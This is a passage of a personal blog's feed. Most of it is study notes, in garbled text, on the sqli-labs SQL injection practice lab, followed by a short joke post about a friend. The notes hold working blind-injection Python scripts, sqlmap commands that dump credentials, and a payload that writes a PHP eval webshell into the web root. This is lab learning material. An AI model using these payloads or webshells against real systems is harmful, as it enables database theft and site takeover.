r = c.getresponse()
print(r.status, r.reason) #çŠ¶æ€å­—ï¼ŒçŠ¶æ€åŸå› 
data = r.read()
print(data)
</code></pre>
<h3 id="ç»“æœ">ç»“æœ</h3>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1624212566178.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>id=-1--+ï¼Œå…¶ä»–éƒ½ä¸€æ ·</p>
<h1 id="less-3">less-3</h1>
<p>id=-1')--+,å…¶ä»–éƒ½ä¸€æ ·</p>
<h1 id="less-4">less-4</h1>
<p>id=-1&quot;)--+,å…¶ä»–éƒ½ä¸€æ ·</p>
<h1 id="less-5getç›²æ³¨">less-5(getç›²æ³¨)</h1>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……">çŸ¥è¯†ç‚¹è¡¥å……ï¼š</h3>
<pre><code>%s åœ¨pythonä¸­ç”¨æ³•ï¼š
1. %10sä»£è¡¨è¾“å‡ºå®½åº¦ä¸º10ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¾“å‡ºçš„å­—ç¬¦ä¸²ä¸è¶…è¿‡10ï¼Œåˆ™åœ¨å·¦è¾¹è¡¥ç©ºæ ¼ï¼›å®½åº¦è¶…è¿‡10ï¼ŒæŒ‰åŸé•¿åº¦è¾“å‡º
2. %-10sè¡¨ç¤ºå¦‚æœè¾“å‡ºçš„å­—ç¬¦ä¸²å®½åº¦ä¸è¶…è¿‡10ï¼Œåˆ™åœ¨å³è¾¹è¡¥é½ç©ºæ ¼ï¼›å®½åº¦è¶…è¿‡10ï¼ŒæŒ‰åŸé•¿åº¦è¾“å‡º
3. %.10sè¡¨ç¤ºæˆªå–å‰10ä¸ªå­—ç¬¦ï¼Œè‹¥åŸé•¿åº¦ä¸å¤Ÿ10ï¼Œåˆ™åŸæ ·è¾“å‡º
4. %s ä½œä¸ºå¾…å®šå­—ç¬¦ï¼Œåœ¨å%ï¼ˆi,jï¼‰å¯è¿›è¡Œæ›¿æ¢ï¼Œè¾¾åˆ°çˆ†ç ´æ•ˆæœ
</code></pre>
<h3 id="è„šæœ¬çˆ†ç ´æ•°æ®åº“åç§°">è„šæœ¬ï¼šçˆ†ç ´æ•°æ®åº“åç§°</h3>
<pre><code class="language-python">import urllib.parse
import http.client

#çˆ†ç ´å­—å…¸
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#ä¸ç¡®å®šå­—æ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‰‹æ³¨ç¡®è®¤æˆ–è€…æŠŠçˆ†ç ´å­—æ•°èŒƒå›´æ‰©å¤§
for i in range(1,20):
	for j in d:
		c = http.client.HTTPConnection(url)

        # ä¸€ä¸ªå¤§å‘ï¼šå¿…é¡»æ˜¯urlç¼–ç ï¼Œé™¤äº†%så¤–éƒ½æ˜¯%%å‰ç¼€ï¼Œå¦åˆ™ä¼šæŠ¥é”™
		body = &quot;/sqli/Less-5/?id=1%%27%%20and%%20mid(database(),%s,1)=%%27%s%%27--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #ç¡®å®šæ–¹å¼
		r = c.getresponse() #æå–å“åº”åŒ…
		data = r.read()
		c.close()
		#ç¡®è®¤æ­£ç¡®çš„ä¸€é¡¹ï¼Œæ‹¼æ¥
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="ç»“æœ-2">ç»“æœ</h3>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1624215382215.png" alt="" loading="lazy"></figure>
<h1 id="less-6sqlmapè„šæœ¬">less-6ï¼ˆsqlmap+è„šæœ¬ï¼‰</h1>
<p>ï¼ˆemmmmm,ä¸å¾—ä¸è¯´ç¬¬ä¸€æ¬¡ä½¿ç”¨sqlmap,æ€€ç–‘è‡ªå·±ä¹‹å‰çˆ†ç ´ä¸ªåº“åéƒ½æ­»å»æ´»æ¥ï¼Œæ˜¯ä¸æ˜¯å‚»= =ï¼‰</p>
<h3 id="æŸ¥çœ‹åº“å">æŸ¥çœ‹åº“å</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --dbs 
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1624216731977.png" alt="" loading="lazy"></figure>
<h3 id="æŸ¥çœ‹è¡¨å">æŸ¥çœ‹è¡¨å</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; --tables
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1624216883317.png" alt="" loading="lazy"></figure>
<h3 id="æŸ¥çœ‹åˆ—å">æŸ¥çœ‹åˆ—å</h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --columns
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1624217172590.png" alt="" loading="lazy"></figure>
<h3 id="æŸ¥çœ‹ç”¨æˆ·å¯†ç ">æŸ¥çœ‹ç”¨æˆ·å¯†ç </h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-6/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;id&quot;,&quot;password&quot; --dump
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1624218772000.png" alt="" loading="lazy"></figure>
<h3 id="è„šæœ¬æŸ¥è¯¢id2çš„ç”¨æˆ·å¯†ç ">è„šæœ¬ï¼šæŸ¥è¯¢id=2çš„ç”¨æˆ·å¯†ç </h3>
<pre><code class="language-python"># å¤åˆ¶ç²˜è´´ä¿®æ”¹body
import urllib.parse
import http.client

#çˆ†ç ´å­—å…¸
d = list('abcdefghijklmnopqrstuvwxyz123456789-_')
name = ''
url = &quot;127.0.0.1&quot;

#ä¸ç¡®å®šå­—æ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‰‹æ³¨ç¡®è®¤æˆ–è€…æŠŠçˆ†ç ´å­—æ•°èŒƒå›´æ‰©å¤§
for i in range(1,15):
	for j in d:
		c = http.client.HTTPConnection(url)
		body = &quot;/sqli/Less-6/?id=1%%22%%20and%%20mid((select%%20password%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27%%20--+&quot; % (i,j)
		print(body)
		c.request(&quot;GET&quot;, body) #ç¡®å®šæ–¹å¼
		r = c.getresponse() #æå–å“åº”åŒ…
		data = r.read()
		c.close()
		#ç¡®è®¤æ­£ç¡®çš„ä¸€é¡¹ï¼Œæ‹¼æ¥
		if data.find(b'You are in') &gt;0: 
			name += j
			print(j)
			break
		else:
			print(&quot;no&quot;)
print(name)
</code></pre>
<h3 id="ç»“æœ-3">ç»“æœ</h3>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/1624223954426.png" alt="" loading="lazy"></figure>
<h1 id="less-7">less-7</h1>
<p>id=1'))--+,å¸ƒå°”ç›²æ³¨ï¼Œè„šæœ¬åŸºæœ¬ä¸€æ ·<br>
ç»ƒä¹ ä¸€ä¸‹sqlmap</p>
<h3 id="æŸ¥è¯¢å¼€å¤´ä¸ºaçš„ç”¨æˆ·å’Œå¯†ç ">æŸ¥è¯¢å¼€å¤´ä¸ºaçš„ç”¨æˆ·å’Œå¯†ç </h3>
<pre><code>sqlmap.py  -u &quot;http://127.0.0.1/sqli/Less-7/?id=1/&quot; -D &quot;security&quot; -T &quot;users&quot; --sql-query=&quot;select username,password from users where username like 'a%'&quot;;
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/1624275315411.png" alt="" loading="lazy"></figure>
<h1 id="less-8">less-8</h1>
<p>id=1'--+,å…¶ä»–ä¸€æ ·</p>
<h1 id="less-9æ—¶é—´ç›²æ³¨">less-9(æ—¶é—´ç›²æ³¨)</h1>
<h3 id="è„šæœ¬id2çš„ç”¨æˆ·åè¦å¤šè¿è¡Œä¸€ä¸¤æ¬¡æ’é™¤å› ä¸ºç½‘é€Ÿå‡ºç°çš„å»¶è¿Ÿ">è„šæœ¬ï¼šid=2çš„ç”¨æˆ·åï¼Œè¦å¤šè¿è¡Œä¸€ä¸¤æ¬¡ï¼Œæ’é™¤å› ä¸ºç½‘é€Ÿå‡ºç°çš„å»¶è¿Ÿ</h3>
<pre><code class="language-python">import time
import urllib.parse
import http.client

#çˆ†ç ´å­—å…¸
d = list('abcdefghijklmnopqrstuvwxyz')
name = ''
url = &quot;127.0.0.1&quot;

#ä¸ç¡®å®šå­—æ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥æ‰‹æ³¨ç¡®è®¤æˆ–è€…æŠŠçˆ†ç ´å­—æ•°èŒƒå›´æ‰©å¤§
for i in range(1,15):
    for j in d:
        time1=time.time() #å¼€å§‹æ—¶é—´
        c=http.client.HTTPConnection(url)
        body=&quot;/sqli/Less-9/?id=1%%27%%20and%%20if(mid((select%%20username%%20from%%20security.users%%20where%%20id=2),%s,1)=%%27%s%%27,sleep(1),0)--+&quot;%(i,j)
        print(body)
        c.request(&quot;GET&quot;, body) #ç¡®å®šæ–¹å¼
        r = c.getresponse() #æå–å“åº”åŒ…
        time2=time.time() #ç»“æŸæ—¶é—´
        data = r.read()
        c.close()
        #ç¡®è®¤æ­£ç¡®çš„ä¸€é¡¹ï¼Œæ‹¼æ¥
        if time2-time1 &gt;1:
            name += j
            print(j)
            break
		
print(name)
</code></pre>
<h3 id="ç»“æœ-4">ç»“æœ</h3>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/1624287255225.png" alt="" loading="lazy"></figure>
<h1 id="less-10">less-10</h1>
<p>id=1&quot;--+,å…¶ä»–å’Œ9ä¸€æ ·</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[sqli-labså­¦ä¹ 1~20]]></title>
        <id>https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/</id>
        <link href="https://z0ekball.github.io/post/sql-zhu-ru-ji-chu-zhi-shi/">
        </link>
        <updated>2021-06-05T12:22:39.000Z</updated>
        <content type="html"><![CDATA[<h5 id="æ³¨ä¸ºæ–¹ä¾¿å­¦ä¹ åŠ å…¥ä¸¤è¡Œä»£ç ">æ³¨ï¼šä¸ºæ–¹ä¾¿å­¦ä¹ ,åŠ å…¥ä¸¤è¡Œä»£ç </h5>
<pre><code class="language-sql">echo $sql;
echo &quot;&lt;br&gt;&quot;;
</code></pre>
<h1 id="è´¯ç©¿å§‹ç»ˆçš„æ­¥éª¤">è´¯ç©¿å§‹ç»ˆçš„æ­¥éª¤ï¼š</h1>
<pre><code class="language-sql">mysqlæŸ¥è¯¢è¯­å¥
æŸ¥åº“ï¼šselect schema_name from information_schema.schemata;
æŸ¥è¡¨ï¼šselect table_name from information_schema.tables where table_schema='security';
æŸ¥åˆ—ï¼šselect column_name from information_schema.columns where table_name='users';
æŸ¥å­—æ®µï¼šselect username,password from security.users;
</code></pre>
<h1 id="less-1">less-1</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1'--+</p>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……">çŸ¥è¯†ç‚¹è¡¥å……ï¼š</h3>
<pre><code class="language-sql">* order by //åˆ¤æ–­å¤šå°‘ä¸ªæ³¨å…¥ç‚¹
* union select  1,2,3  //æŸ¥çœ‹é‚£äº›æ•°æ®å¯ä»¥å›æ˜¾(id=-1)
* group_concat() //æ‰¹é‡æŸ¥è¯¢
* concat_ws('~',a,b) //æŸ¥è¯¢a~b
</code></pre>
<h3 id="æŸ¥çœ‹å½“å‰æ•°æ®åº“">æŸ¥çœ‹å½“å‰æ•°æ®åº“</h3>
<pre><code class="language-sql">id=-1' union select 1,2,database() --+
id=-1'  union select 1,2,concat_ws('~',user(),version(),database()) --+ 
//æŸ¥è¯¢æ•°æ®åº“ç‰ˆæœ¬,è·¯å¾„,å½“å‰ç”¨æˆ·,å½“å‰æ•°æ®åº“
</code></pre>
<h3 id="æŸ¥çœ‹æ•°æ®åº“æ‰€æœ‰æ•°æ®åº“">æŸ¥çœ‹æ•°æ®åº“/æ‰€æœ‰æ•°æ®åº“</h3>
<pre><code class="language-sql">id=-1' union select 1,2,schema_name from information_schema.schemata limit 4,1--+  //limit å†³å®šæŸ¥çœ‹åºæ•°
id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
</code></pre>
<h3 id="æŸ¥çœ‹è¡¨æ‰€æœ‰è¡¨">æŸ¥çœ‹è¡¨/æ‰€æœ‰è¡¨</h3>
<pre><code class="language-sql">id=-1' union select 1,2,table_name from information_schema.tables where table_schema=0x() limit 1,1--+
//åå…­è¿›åˆ¶ç»•è¿‡
id=-1' union select 1,2,group_concat(table_name) from information_schema. tables where table_schema=0x()--+
</code></pre>
<h3 id="æŸ¥çœ‹åˆ—ä¿¡æ¯æ‰€æœ‰åˆ—ä¿¡æ¯">æŸ¥çœ‹åˆ—ä¿¡æ¯/æ‰€æœ‰åˆ—ä¿¡æ¯</h3>
<pre><code class="language-sql">id=-1' union select 1,2,column_name from information_schema.columns where table_name=0x() --+

id=-1' union select 1,2,group_concat(column_name) from information_schema. columns where table_name=0x()--+
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/1623248765124.png" alt="" loading="lazy"></figure>
<h3 id="è¿æ¥æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç æ‰€æœ‰ç”¨æˆ·å’Œå¯†ç ">è¿æ¥æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç /æ‰€æœ‰ç”¨æˆ·å’Œå¯†ç </h3>
<pre><code class="language-sql">id=-1'  union select 1,2,concat_ws('~',username,password)from security.users limit 1,1--+

id=-1' union select 1,2,group_concat(concat_ws('~',username,password))from security.users--+
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/1623248880427.png" alt="" loading="lazy"></figure>
<h1 id="less-2">less-2</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1--+,ä¸éœ€è¦'</p>
<h1 id="less-3">less-3</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1')--+</p>
<h1 id="less-4">less-4</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1â€)--+</p>
<h1 id="less-5å¸ƒå°”å‹ç›²æ³¨">less-5ï¼ˆå¸ƒå°”å‹ç›²æ³¨ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼š1'--+,å¸ƒå°”å‹ç›²æ³¨</p>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……-2">çŸ¥è¯†ç‚¹è¡¥å……</h3>
<pre><code class="language-sql">1. left(a,b) ä»å·¦ä¾§æˆªå–açš„å‰bä½,æ­£ç¡®è¿”å›1,é”™åˆ™è¿”å›0 â€”â€”burpsuitçˆ†ç ´
2. regexp æ­£åˆ™è¡¨è¾¾å¼
/è½¬æ„
^åŒ¹é…å¼€å§‹éƒ¨åˆ†
$åŒ¹é…ç»“æŸéƒ¨åˆ†
.åŒ¹é…ä»»ä½•å­—ç¬¦
[:character_class:]æœ¯è¯­ç±»çš„æ‰€æœ‰å­—ç¬¦åŒ¹é…çš„å­—ç¬¦ç±»
[[:&lt;:]],[[:&gt;:]]word è¾¹ç•Œ,
3. like 
'n%'ä»¥Nå¼€å§‹çš„
'%g'ä»¥gç»“å°¾
'%s%'åŒ…å«s
4.substr(a,b,c) ä»bå¼€å§‹,æˆªå–aå­—ç¬¦cä½é•¿åº¦
ascii(substr((select database()),1,1)2åˆ†æ³•è·å¾—å­—ç¬¦ 
//å½“æ²¡æœ‰åœ¨å½“å‰æ•°æ®åº“ä¸‹æ²¡æœ‰å›æ˜¾,ä¸€èˆ¬ä¸é€‚ç”¨
</code></pre>
<h3 id="çŒœæµ‹å­—ç¬¦æ–¹æ³•">çŒœæµ‹å­—ç¬¦æ–¹æ³•</h3>
<pre><code>burpsuiteçˆ†ç ´
æ‰‹åŠ¨äºŒåˆ†æ³•
è„šæœ¬
</code></pre>
<h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3>
<pre><code class="language-sql">burpsuite:  id=1' and left((select database()),1))='a'--+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623250110147.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623250114161.png" alt="" loading="lazy"></p>
<h1 id="less-6">less-6</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1â€--+,å¸ƒå°”å‹ç›²æ³¨</p>
<h1 id="less-7ä¸€å¥è¯æœ¨é©¬">less-7ï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1'))--+,å¸ƒå°”å‹ç›²æ³¨</p>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……-3">çŸ¥è¯†ç‚¹è¡¥å……ï¼š</h3>
<pre><code class="language-sql">1.ä¸€å¥è¯æœ¨é©¬ï¼š &lt;?php @eval($_POST['attack']);?&gt;
ã€åŸºæœ¬åŸç†ã€‘åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´,å¾€ç›®æ ‡ç½‘ç«™ä¸­ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬,ç„¶åä½ å°±å¯ä»¥åœ¨æœ¬åœ°é€šè¿‡ä¸­å›½èœåˆ€chopper.exeå³å¯è·å–å’Œæ§åˆ¶æ•´ä¸ªç½‘ç«™ç›®å½•ã€‚@è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯,ä¹Ÿä¸æŠ¥é”™ã€‚eval()å‡½æ•°è¡¨ç¤ºæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„å…¨éƒ½å½“åšä»£ç æ‰§è¡Œã€‚$_POST['attack']è¡¨ç¤ºä»é¡µé¢ä¸­è·å¾—attackè¿™ä¸ªå‚æ•°å€¼ã€‚
ã€æ¡ä»¶ã€‘
(1)æœ¨é©¬ä¸Šä¼ æˆåŠŸ,æœªè¢«æ€;
(2)çŸ¥é“æœ¨é©¬çš„è·¯å¾„åœ¨å“ª;
(3)ä¸Šä¼ çš„æœ¨é©¬èƒ½æ­£å¸¸è¿è¡Œã€‚
2.load_file('æ–‡ä»¶è·¯å¾„')ï¼šè¯»å–æœ¬åœ°æ–‡ä»¶ (é¿å…ç‰¹æ®Šå­—ç¬¦ä½¿ç”¨åŒæ–œæ \\)
3.into outfileï¼šå†™æ–‡ä»¶
</code></pre>
<h3 id="ç¤ºä¾‹-2">ç¤ºä¾‹</h3>
<pre><code class="language-sql">id=1')) union select 1,2,'&lt;?php @eval($_POST[''pass'']);?&gt;' into outfile 'D:\\learning_tools\\phpstudy\\phpstudy_pro\\WWW\\sqli\\Less-7\\test2.php' --+
</code></pre>
<p><img src="https://z0ekball.github.io/post-images/1623251647771.png" alt="" loading="lazy"><br>
<img src="https://z0ekball.github.io/post-images/1623251657358.png" alt="" loading="lazy"></p>
<h1 id="less-8">less-8</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1'--+,å¸ƒå°”ç›²æ³¨</p>
<h1 id="less-9æ—¶é—´ç›²æ³¨">less-9ï¼ˆæ—¶é—´ç›²æ³¨ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1' --+,æ—¶é—´ç›²æ³¨</p>
<h3 id="å®ä¾‹">å®ä¾‹</h3>
<pre><code class="language-sql">id=1' and sleep(5)--+ //å»¶è¿Ÿ5ç§’è¡¨ç¤ºæ³¨å…¥æˆåŠŸ
</code></pre>
<h1 id="less-10">less-10</h1>
<p>æ³¨å…¥æ¼æ´ï¼šid=1â€--+,æ—¶é—´ç›²æ³¨</p>
<h1 id="less-11">less-11</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=n'or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h3 id="å®ä¾‹-å’Œgetç›¸åŒ">å®ä¾‹ (å’Œgetç›¸åŒ)</h3>
<pre><code class="language-sql">//æŸ¥å¤šå°‘ä¸ªæ³¨å…¥ç‚¹
uname=n' order by 2 #&amp;passwd=admin&amp;submit=Submit

//æŸ¥åˆ°æ•°æ®åº“â€”â€”security
uname=n' union select 1,schema_name from information_schema.schemata limit 2,1 #&amp;passwd=admin&amp;submit=Submit 

//æŸ¥çœ‹è¡¨â€”â€”users
uname=n' union select 1,group_concat(table_name) from information_schema.tables where table_schema='security'  #&amp;passwd=admin&amp;submit=Submit

//æŸ¥çœ‹åˆ—â€”â€”username
uname=n' union select 1,group_concat(column_name) from information_schema.columns where table_name='users'  #&amp;passwd=admin&amp;submit=Submit

//æŸ¥æ‰€æœ‰username
uname=n' union select 1,group_concat(username) from security.users  #&amp;passwd=admin&amp;submit=Submit

//æŸ¥è¯¢ç”¨æˆ·~å¯†ç 
uname=n' union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users  #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/1623253088112.png" alt="" loading="lazy"></figure>
<h1 id="less-12">less-12</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=n&quot;) or 1=1 #&amp;passwd=admin&amp;submit=Submit</p>
<h1 id="less-13-å¸ƒå°”ç›²æ³¨">less-13 (å¸ƒå°”ç›²æ³¨)</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=n') or 1=1 #&amp;passwd=admin&amp;submit=Submit<br>
å¸ƒå°”å‹ç›²æ³¨</p>
<h3 id="å®ä¾‹-2">å®ä¾‹</h3>
<pre><code class="language-sql">burp suiteçˆ†ç ´ï¼š
uname=n') or left(database(),1)='a' #&amp;passwd=admin&amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/1623253489685.png" alt="" loading="lazy"></figure>
<h1 id="less-14">less-14</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=n&quot; or 1=1#&amp;passwd=admin&amp;submit=Submit<br>
å¸ƒå°”å‹ç›²æ³¨</p>
<h1 id="less-15">less-15</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=addmin&amp;passwd=ad' or 1=1 #&amp;submit=Submit<br>
æ³¨å…¥ç‚¹åœ¨passwd,å…¶ä»–ä¸€æ ·<br>
å¸ƒå°”å‹ç›²æ³¨</p>
<h1 id="less-16">less-16</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=addmin&amp;passwd=ad&quot; or 1=1 #&amp;submit=Submit<br>
å¸ƒå°”å‹ç›²æ³¨</p>
<h1 id="less-17æ›´æ–°æ¼æ´">less-17ï¼ˆæ›´æ–°æ¼æ´ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼šuname=admin &amp;passwd=dadad' # &amp;submit=Submit<br>
æ›´æ–°å¯†ç å­˜åœ¨æ³¨å…¥æ¼æ´</p>
<h3 id="çŸ¥è¯†ç‚¹è¡¥å……-4">çŸ¥è¯†ç‚¹è¡¥å……</h3>
<pre><code>updatexml(XML_document,XPath_string,new_value)
ç¬¬ä¸€ä¸ªå‚æ•°ï¼šstringæ ¼å¼,xmlæ–‡ä»¶å¯¹è±¡åç§°
ç¬¬äºŒä¸ªå‚æ•°ï¼šxpathæ ¼å¼å­—ç¬¦ä¸²
ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šstringæ ¼å¼,æ›¿æ¢æŸ¥æ‰¾ç¬¦åˆæ¡ä»¶çš„æ•°æ®
ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆèŠ‚ç‚¹æ¡ä»¶çš„èŠ‚ç‚¹å€¼
</code></pre>
<h3 id="å®ä¾‹-3">å®ä¾‹</h3>
<pre><code class="language-sql">//è¿”å›å½“å‰æ•°æ®åº“
uname=admin &amp;passwd=dadad' and updatexml(1,concat(0x7e,(database())),1)# &amp;submit=Submit
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/1623254628297.png" alt="" loading="lazy"></figure>
<h1 id="less-18user-agentæ¼æ´">less-18ï¼ˆUser-Agentæ¼æ´ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼š<br>
User-Agent:'or updatexml(1,concat('~',(database())),1) or '1'='1<br>
//   'é—­åˆ<br>
User-Agent:'or updatexml(1,concat('~',(database())),1), '','')#<br>
//å¦ä¸€ç§é—­åˆ</p>
<h3 id="å®ä¾‹-4">å®ä¾‹</h3>
<pre><code>//æŸ¥åº“
User-Agent:' or updatexml(1,concat(0x7e,(database())),1),'','')#
</code></pre>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/1623256440472.png" alt="" loading="lazy"></figure>
<h1 id="less-19refereræ¼æ´">less-19ï¼ˆRefereræ¼æ´ï¼‰</h1>
<p>æ³¨å…¥æ¼æ´ï¼šReferer:' or updatexml(1,concat('~',(database())),1) or '1'='1<br>
æ³¨å…¥ç‚¹åœ¨referer,å…¶ä»–ä¸€æ ·</p>
<h1 id="less-20-cookieæ¼æ´">less-20 (cookieæ¼æ´)</h1>
<p>æ³¨å…¥æ¼æ´ï¼šcookieä¸­valueå€¼'    #æ³¨å…¥</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å…³äºzyyæ˜¯åªçŒªè¿™ä»¶äº‹]]></title>
        <id>https://z0ekball.github.io/post/a-sa-da-d/</id>
        <link href="https://z0ekball.github.io/post/a-sa-da-d/">
        </link>
        <updated>2021-03-08T13:13:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="ä¼—æ‰€å‘¨çŸ¥çŒªçš„ç«æ¯›å¾ˆé•¿">ä¼—æ‰€å‘¨çŸ¥ï¼ŒçŒªçš„ç«æ¯›å¾ˆé•¿</h2>
<p>zyyä¹Ÿä¸ä¾‹å¤–</p>
<h2 id="çŒªçŒªä¸çˆ±å¹²å‡€">çŒªçŒªä¸çˆ±å¹²å‡€</h2>
<p>zyyä¹Ÿæ˜¯ä¸ªä¸çˆ±æ´—æ¾¡çš„é‚‹é¢æ€ª</p>
<h2 id="çŒªçš„æ¯›å¾ˆå·">çŒªçš„æ¯›å¾ˆå·</h2>
<p>zyyå¤´ä¸Šå‡ æ’®é£æ¯›æ­£æ˜¯å¦‚æ­¤</p>
]]></content>
    </entry>
</feed>